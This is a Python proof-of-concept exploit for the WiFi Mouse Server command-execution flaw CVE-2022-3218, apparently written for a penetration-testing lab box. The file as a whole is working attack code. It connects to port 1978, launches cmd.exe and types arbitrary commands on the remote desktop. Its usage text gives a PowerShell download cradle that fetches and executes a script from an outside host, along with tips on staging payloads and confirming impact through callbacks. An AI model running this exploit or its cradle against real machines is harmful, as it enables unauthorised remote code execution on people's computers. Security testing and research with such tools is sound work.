#!/usr/bin/env python3
"""
mouseserver_poc.py — WiFi Mouse / Mouse Server command execution (CVE-2022-3218).

The no-Metasploit route for this box. Same three primitives as the Metasploit module
and EDB-50972, packaged with a reachability check and a dry-run mode:

    openfile /C/Windows/System32/cmd.exe \\n
    utf8 <command> \\n
    key  3RTN                          # two spaces; 3RTN is the app's Return keycode

Not a shell: keystrokes go to the focused window on the remote desktop, so the target
needs an interactive, UNLOCKED session. A locked session or a headless host accepts the
connection and silently does nothing.

Usage
    ./mouseserver_poc.py 192.168.103.145 --check
    ./mouseserver_poc.py 192.168.103.145 --cmd 'whoami'
    ./mouseserver_poc.py 192.168.103.145 --cmd 'powershell -nop -w hidden -c "iwr -useb http://10.10.14.5/a.ps1 | iex"'
    ./mouseserver_poc.py 192.168.103.145 --cmd 'whoami' --dry-run

Why a staged payload: every byte is typed at desktop speed. Prefer a download cradle
over a long one-liner, and raise --delay if characters are being dropped.

Authorised testing only.
"""

from __future__ import annotations

import argparse
import socket
import sys
import time

DEFAULT_PROGRAM = r"C:\Windows\System32\cmd.exe"


def to_openfile_path(path: str) -> str:
    """C:\\Windows\\System32\\cmd.exe -> /C/Windows/System32/cmd.exe (what the mobile app sends)."""
    return "/" + path.replace("\\", "/").replace(":", "")


class MouseServer:
    def __init__(self, host: str, port: int = 1978, delay: float = 1.0,
                 timeout: float = 8.0, dry_run: bool = False):
        self.host, self.port = host, port
        self.delay, self.timeout, self.dry_run = delay, timeout, dry_run
        self.sock: socket.socket | None = None

    # -- plumbing ---------------------------------------------------------
    def connect(self) -> bool:
        if self.dry_run:
            print(f"[dry-run] would connect to {self.host}:{self.port}")
            return True
        try:
            self.sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
            self.sock.settimeout(self.timeout)
        except OSError as exc:
            print(f"[-] cannot connect to {self.host}:{self.port} — {exc}", file=sys.stderr)
            print("    port filtered/closed, or nothing listening there", file=sys.stderr)
            return False
        print(f"[+] connected to {self.host}:{self.port}")
        return True

    def send(self, payload: bytes, label: str) -> None:
        print(f"    -> {label}: {payload.decode('latin-1').rstrip(chr(10))!r}")
        if not self.dry_run and self.sock is not None:
            self.sock.sendall(payload)

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            finally:
                self.sock = None

    # -- protocol ---------------------------------------------------------
    def open_program(self, path: str = DEFAULT_PROGRAM) -> None:
        self.send(f"openfile {to_openfile_path(path)}\n".encode(), "openfile")
        time.sleep(self.delay)

    def type_text(self, text: str, press_enter: bool = True) -> None:
        self.send(f"utf8 {text}\n".encode(), "utf8")
        time.sleep(self.delay)
        if press_enter:
            self.send(b"key  3RTN", "key")
            time.sleep(self.delay)

    # -- modes ------------------------------------------------------------
    def check(self) -> bool:
        """Reachability + fingerprint: connect, read whatever the server volunteers, send nothing."""
        if not self.connect():
            return False
        if self.dry_run:
            return True
        try:
            self.sock.settimeout(2.0)
            data = self.sock.recv(128)
            if data:
                print(f"[+] server sent {len(data)} byte(s) unprompted: {data!r}")
                if b"needpassword" in data.lower():
                    print("[+] 'needpassword' banner => Mouse Server "
                          "(auth is enforced client-side, still exploitable)")
            else:
                print("[+] connection accepted, no banner (typical for Mouse Server)")
        except socket.timeout:
            print("[+] no banner within 2s (typical for Mouse Server) — socket accepted")
        except OSError as exc:
            print(f"[-] connection dropped: {exc}", file=sys.stderr)
            return False
        return True


def main() -> int:
    ap = argparse.ArgumentParser(
        description="WiFi Mouse Server (CVE-2022-3218) command execution PoC",
        epilog="Keystrokes go to the focused window on the remote desktop.")
    ap.add_argument("host")
    ap.add_argument("--port", type=int, default=1978)
    ap.add_argument("--check", action="store_true", help="reachability/fingerprint only, send nothing")
    ap.add_argument("--cmd", action="append", metavar="COMMAND",
                    help="command typed into cmd.exe (repeatable, executed in order)")
    ap.add_argument("--program", default=DEFAULT_PROGRAM, help="program to launch first")
    ap.add_argument("--delay", type=float, default=1.0,
                    help="seconds between actions; raise to 2-3 if characters are dropped")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--no-exit", action="store_true", help="leave the window open")
    ap.add_argument("--dry-run", action="store_true", help="print packets without sending")
    args = ap.parse_args()

    if not args.check and not args.cmd:
        ap.error("nothing to do: pass --check or at least one --cmd")

    client = MouseServer(args.host, args.port, args.delay, args.timeout, args.dry_run)

    if args.check:
        ok = client.check()
        client.close()
        print("[+] reachable" if ok else "[-] not reachable")
        return 0 if ok else 1

    if not client.connect():
        return 1
    try:
        print(f"[*] launching {args.program}")
        client.open_program(args.program)
        for i, cmd in enumerate(args.cmd, 1):
            print(f"[*] command {i}/{len(args.cmd)}")
            client.type_text(cmd)
        if not args.no_exit:
            print("[*] closing the window")
            client.type_text("exit")
    finally:
        client.close()

    if args.dry_run:
        print("[dry-run] nothing was sent.")
    else:
        print("[+] sent. Prove impact off-box (callback, HTTP hit, or a file you can retrieve);")
        print("    you cannot see the remote screen.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
